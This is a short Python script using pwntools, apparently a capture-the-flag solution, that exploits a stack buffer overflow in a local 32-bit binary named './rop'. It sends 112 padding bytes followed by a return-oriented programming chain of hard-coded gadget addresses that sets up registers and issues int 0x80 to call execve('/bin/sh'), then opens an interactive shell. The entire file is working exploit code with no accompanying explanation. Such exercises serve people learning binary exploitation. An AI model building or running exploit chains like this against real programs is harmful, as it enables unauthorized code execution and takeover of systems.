from pwn import *
p = process("./rop")

# execve("/bin/sh",0,0)
# eax => 11
# ebx => /bin/sh
# ecx => 0
# edx => 0

# 0x080b7fb6 : pop eax ; ret
# 0x0806ee30 : pop edx ; pop ecx ; pop ebx ; ret

bin_sh = 0x80bb128
pop_eax = 0x080b7fb6
pop_edx_ecx_ebx = 0x0806ee30
int80 = 0x0806ca85
p1 = "A"*112+p32(pop_eax)+p32(11)+p32(pop_edx_ecx_ebx)+p32(0)+p32(0)+p32(bin_sh)+p32(int80)

p.sendline(p1)
p.interactive()

